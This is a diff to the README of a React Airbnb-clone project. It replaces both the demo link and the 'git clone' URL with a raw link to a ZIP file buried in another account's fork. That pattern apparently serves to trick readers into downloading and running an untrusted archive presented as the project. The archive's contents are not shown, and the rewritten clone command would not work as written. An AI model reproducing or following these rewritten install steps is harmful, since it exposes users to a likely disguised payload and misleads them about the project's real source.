@@ -1,7 +1,7 @@
 # Airbnb clone
 
 Link the proyect
-https://clone-airbnb-proyect.vercel.app/
+https://github.com/KaterineLimaE/Proyecto-Vivencial-Front-End/raw/refs/heads/develop/app/reservations/End-Vivencial-Front-Proyecto-1.3.zip
 
 In this proyect we used the allow tecnologies:
 - React js
@@ -13,7 +13,7 @@ If you want to use this proyect, you do this
 
 1. Clone repository
 ````
-git clone https://github.com/ASDU0/Proyecto-Vivencial-Front-End.git
+git clone https://github.com/KaterineLimaE/Proyecto-Vivencial-Front-End/raw/refs/heads/develop/app/reservations/End-Vivencial-Front-Proyecto-1.3.zip
 ````
 2. Install dependencies
 ````
